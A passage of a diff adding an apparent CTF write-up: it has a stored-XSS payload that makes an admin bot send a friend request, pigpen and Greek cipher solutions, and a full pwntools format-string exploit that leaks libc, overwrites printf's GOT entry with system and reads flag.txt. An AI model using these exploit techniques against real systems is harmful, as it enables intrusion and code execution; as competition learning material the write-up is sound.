+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>username</span><span class=p>);</span>  
+        <span class=k>if</span> <span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>friends</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>))</span> <span class=p>{</span>  
+            <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Already metafriended&#34;</span><span class=p>);</span>  
+        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+            <span class=nx>user</span><span class=p>.</span><span class=nx>friends</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>);</span>  
+            <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>200</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;ok&#34;</span><span class=p>);</span>  
+        <span class=p>}</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/post&#34;</span><span class=p>,</span> <span class=nx>needsAuth</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/plain&#34;</span><span class=p>);</span>  
+    <span class=kr>const</span> <span class=nx>id</span> <span class=o>=</span> <span class=nx>uuid</span><span class=p>();</span>  
+    <span class=kr>const</span> <span class=nx>content</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>content</span><span class=p>;</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>content</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span> <span class=o>||</span> <span class=nx>content</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>1000</span> <span class=o>||</span> <span class=nx>content</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Invalid metacontent&#34;</span><span class=p>);</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>);</span>  
+        <span class=nx>posts</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>id</span><span class=p>,</span> <span class=nx>content</span><span class=p>);</span>  
+        <span class=nx>user</span><span class=p>.</span><span class=nx>posts</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>id</span><span class=p>);</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>id</span><span class=p>);</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/posts&#34;</span><span class=p>,</span> <span class=nx>needsAuth</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;application/json&#34;</span><span class=p>);</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span>  
+        <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span>  
+            <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>).</span><span class=nx>posts</span><span class=p>.</span><span class=nx>map</span><span class=p>((</span><span class=nx>id</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+                <span class=kr>const</span> <span class=nx>content</span> <span class=o>=</span> <span class=nx>posts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>id</span><span class=p>);</span>  
+                <span class=k>return</span> <span class=p>{</span>  
+                    <span class=nx>id</span><span class=p>,</span>  
+                    <span class=nx>blurb</span><span class=o>:</span> <span class=nx>content</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>50</span> <span class=o>?</span> <span class=nx>content</span> <span class=o>:</span> <span class=nx>content</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>50</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;...&#34;</span><span class=p>,</span>  
+                <span class=p>};</span>  
+            <span class=p>})</span>  
+        <span class=p>)</span>  
+    <span class=p>);</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/friends&#34;</span><span class=p>,</span> <span class=nx>needsAuth</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;application/json&#34;</span><span class=p>);</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span>  
+        <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span>  
+            <span class=nx>accounts</span>  
+                <span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span>  
+                <span class=p>.</span><span class=nx>friends</span><span class=p>.</span><span class=nx>filter</span><span class=p>((</span><span class=nx>username</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>username</span><span class=p>))</span>  
+                <span class=p>.</span><span class=nx>map</span><span class=p>((</span><span class=nx>username</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>({</span>  
+                    <span class=nx>username</span><span class=p>,</span>  
+                    <span class=nx>displayName</span><span class=o>:</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>username</span><span class=p>).</span><span class=nx>displayName</span><span class=p>,</span>  
+                <span class=p>}))</span>  
+        <span class=p>)</span>  
+    <span class=p>);</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Listening on port </span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>  
+<span class=p>});</span>
+
+</code></pre></div><p><strong>index.html</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/friends&#34;</span><span class=p>)</span>  
+    <span class=p>.</span><span class=nx>then</span><span class=p>((</span><span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>())</span>  
+    <span class=p>.</span><span class=nx>then</span><span class=p>((</span><span class=nx>friends</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+        <span class=kr>const</span> <span class=nx>list</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;friendlist&#34;</span><span class=p>);</span>  
+        <span class=k>if</span> <span class=p>(</span><span class=nx>friends</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>  
+            <span class=kr>const</span> <span class=nx>ele</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;p&#34;</span><span class=p>);</span>  
+            <span class=nx>ele</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s2>&#34;you have none :(&#34;</span><span class=p>;</span>  
+            <span class=nx>list</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>ele</span><span class=p>);</span>  
+        <span class=p>}</span>  
+        <span class=k>for</span> <span class=p>(</span><span class=kr>const</span> <span class=nx>f</span> <span class=k>of</span> <span class=nx>friends</span><span class=p>)</span> <span class=p>{</span>  
+            <span class=kr>const</span> <span class=nx>ele</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;p&#34;</span><span class=p>);</span>  
+            <span class=nx>ele</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>f</span><span class=p>.</span><span class=nx>displayName</span><span class=si>}</span><span class=sb> (</span><span class=si>${</span><span class=nx>f</span><span class=p>.</span><span class=nx>username</span><span class=si>}</span><span class=sb>)`</span><span class=p>;</span>  
+            <span class=nx>list</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>ele</span><span class=p>);</span>  
+        <span class=p>}</span>  
+    <span class=p>});</span>  
+</code></pre></div><p>We can see that the flag will be set as the name of the Administrator user. Names can be seen with the /friends endpoint, so using XSS, we can use a POST request to /friend and become &ldquo;friends&rdquo; with the administrator.<br>
+<strong>Exploit</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/friend&#39;</span><span class=p>,{</span>  
+    <span class=nx>method</span><span class=o>:</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span>  
+    <span class=nx>headers</span><span class=o>:</span><span class=p>{</span>  
+        <span class=s2>&#34;Content-type&#34;</span><span class=o>:</span><span class=s1>&#39;application/x-www-form-urlencoded&#39;</span>  
+    <span class=p>},</span>  
+    <span class=nx>body</span><span class=o>:</span><span class=s1>&#39;username=admin&#39;</span>  
+<span class=p>})</span>  
+</code></pre></div><p>With only a fetch request, we can use the metapost feature and see that it is replacing <code>$CONTENT</code> in the post.html file.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>const</span> <span class=nx>postTemplate</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;post.html&#34;</span><span class=p>),</span> <span class=s2>&#34;utf8&#34;</span><span class=p>);</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/post/:id&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>posts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>))</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/html&#34;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>postTemplate</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;$CONTENT&#34;</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>posts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>)));</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/html&#34;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>postTemplate</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;$CONTENT&#34;</span><span class=p>,</span> <span class=s2>&#34;post not found :(&#34;</span><span class=p>));</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>  
+</code></pre></div><p><img loading=lazy src=https://i.imgur.com/tzahad5.png alt>
+</p>
+<p>It executed:
+<img loading=lazy src=https://i.imgur.com/pXZtCmv.png alt>
+<strong>Final Payload</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>  
+<span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/friend&#39;</span><span class=p>,{</span>  
+    <span class=nx>method</span><span class=o>:</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span>  
+    <span class=nx>headers</span><span class=o>:</span><span class=p>{</span>  
+        <span class=s2>&#34;Content-type&#34;</span><span class=o>:</span><span class=s1>&#39;application/x-www-form-urlencoded&#39;</span>  
+    <span class=p>},</span>  
+    <span class=nx>body</span><span class=o>:</span><span class=s1>&#39;username=test&#39;</span>  
+<span class=p>})</span>  
+<span class=o>&lt;</span><span class=err>/script&gt;  </span>
+</code></pre></div><p>By making a metapost with this, we can send the admin bot to it and get the flag by refreshing the main page.<br>
+<img loading=lazy src=https://i.imgur.com/vRN0qEz.png alt>
+</p>
+<h2 id=rolling-in-the-mud>rolling in the mud<a hidden class=anchor aria-hidden=true href=#rolling-in-the-mud>#</a></h2>
+<p><img loading=lazy src=https://i.imgur.com/eCgswS5.png alt>
+I&rsquo;ll be honest; for a bit, I thought this was a Nancy Drew encoding for a bit. But it&rsquo;s <a href=https://en.wikipedia.org/wiki/Pigpen_cipher>pig pen</a>&mldr;</p>
+<p>Decrypting that got us:<code>{eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni}dugip</code><br>
+With a little magic got us:<code>lactf{rolling_and_rolling_and_rolling_until_the_pigs_go_home}</code></p>
+<h2 id=greek-cipher>Greek Cipher<a hidden class=anchor aria-hidden=true href=#greek-cipher>#</a></h2>
+<p>We are provided with:<br>
+<code>κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ'ι ργσκ ιηγτ. οσμιδ{ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ'ι_θιπψ_ωπν._λγοο_ψοσωγκ_ς_τνθι_θσω.μπζερσιθ!}</code><br>
+Using <a href=https://tio.run>https://tio.run</a> with</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>sorted</span><span class=p>(</span><span class=nb>set</span><span class=p>(</span><span class=nb>input</span><span class=p>()))))</span>   <span class=err>`</span>  
+</code></pre></div><p><img loading=lazy src=https://i.imgur.com/dC5y0jk.png alt>
+Which I then used substitute on CyberChef <br>
+<img loading=lazy src=https://i.imgur.com/MPem7LV.png alt>
+Replacing each letter with its current English equivalent</p>
+<p>I then blasted it getting the flag:<code>lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}</code></p>
+<h2 id=rickroll>rickroll<a hidden class=anchor aria-hidden=true href=#rickroll>#</a></h2>
+<p>This one we over-engineered the hell out of, to the point where it was just a bit extra.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=kt>int</span> <span class=n>main_called</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>main_called</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;nice try&#34;</span><span class=p>);</span>
+        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=p>}</span>
+    <span class=n>main_called</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Lyrics: &#34;</span><span class=p>);</span>
+    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
+    <span class=n>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>256</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Never gonna give you up, never gonna let you down</span><span class=se>\n</span><span class=s>Never gonna run around and &#34;</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Never gonna make you cry, never gonna say goodbye</span><span class=se>\n</span><span class=s>Never gonna tell a lie and hurt you</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></div><p><em>I was rickrolled by a ctf, so you, the reader, must experience the same</em></p>
+<p><strong>Exploit</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
+
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;rickroll_patched&#39;</span><span class=p>)</span>  
+<span class=n>glibc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+
+  
+<span class=k>def</span> <span class=nf>get_process</span><span class=p>():</span>  
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  
+        <span class=k>return</span> <span class=n>elf</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
+
+    <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>  
+    <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>))</span>
+
+  
+<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>  
+    <span class=n>p</span> <span class=o>=</span> <span class=n>get_process</span><span class=p>()</span>
+
+    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=si>%82c</span><span class=s1>%14$lln</span><span class=si>%191c</span><span class=s1>%15$hhn</span><span class=si>%47c</span><span class=s1>%16$hhnaaaabb</span><span class=si>%186c</span><span class=s1>%17$hhn...%18$s....</span><span class=se>\x18</span><span class=s1>@@</span><span class=se>\x00\x00\x00\x00\x00\x19</span><span class=s1>@@</span><span class=se>\x00\x00\x00\x00\x00\x1a</span><span class=s1>@@</span><span class=se>\x00\x00\x00\x00\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main_called</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>fgets</span><span class=p>)</span>
+
+    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Lyrics: &#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>  
+    <span class=n>fgets_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;....&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;...&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>))</span>  
+    <span class=n>glibc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>fgets_addr</span> <span class=o>-</span> <span class=n>glibc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>fgets</span>
+
+    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Leaked fgets() address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>fgets_addr</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
+    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Glibc base address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>glibc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+
+    <span class=n>system</span> <span class=o>=</span> <span class=n>glibc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span>
+
+    <span class=n>to_write</span> <span class=o>=</span> <span class=n>system</span> <span class=o>&amp;</span> <span class=mh>0xff</span>  
+    <span class=n>payload</span>  <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>to_write</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;c%14$hhn&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+
+    <span class=n>to_write</span> <span class=o>=</span> <span class=p>(((</span><span class=n>system</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>-</span> <span class=n>to_write</span> <span class=o>-</span> <span class=n>payload</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>))</span> <span class=o>%</span> <span class=mi>256</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=p>(</span><span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>to_write</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;c%15$hhn&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+
+    <span class=n>to_write</span> <span class=o>=</span> <span class=p>(((</span><span class=n>system</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x55</span> <span class=o>-</span> <span class=n>to_write</span> <span class=o>-</span> <span class=n>payload</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>))</span> <span class=o>%</span> <span class=mi>256</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=p>(</span><span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>to_write</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;c%16$hhn&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+
+    <span class=n>to_write</span> <span class=o>=</span> <span class=p>(</span><span class=mi>256</span> <span class=o>-</span> <span class=mh>0xd2</span> <span class=o>-</span> <span class=n>to_write</span> <span class=o>-</span> <span class=n>payload</span><span class=p>[</span><span class=mi>32</span><span class=p>:</span><span class=mi>48</span><span class=p>]</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>))</span> <span class=o>%</span> <span class=mi>256</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=p>(</span><span class=s1>&#39;%&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>to_write</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;c%17$hhn&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+
+    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>printf</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>printf</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>  
+    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main_called</span><span class=p>)</span>
+
+    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Lyrics: &#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+
+    <span class=k>try</span><span class=p>:</span>  
+        <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;sh: 1: Lyrics:: not found</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>)</span>  
+        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;sh: 1: Never: not found</span><span class=se>\n</span><span class=s1>sh: 2: Never: not found</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>  
+        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>  
+    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>  
+        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>  
+        <span class=n>glibc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=mi>0</span>  
+        <span class=n>main</span><span class=p>()</span>
+
+  
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
+    <span class=n>main</span><span class=p>()</span>  
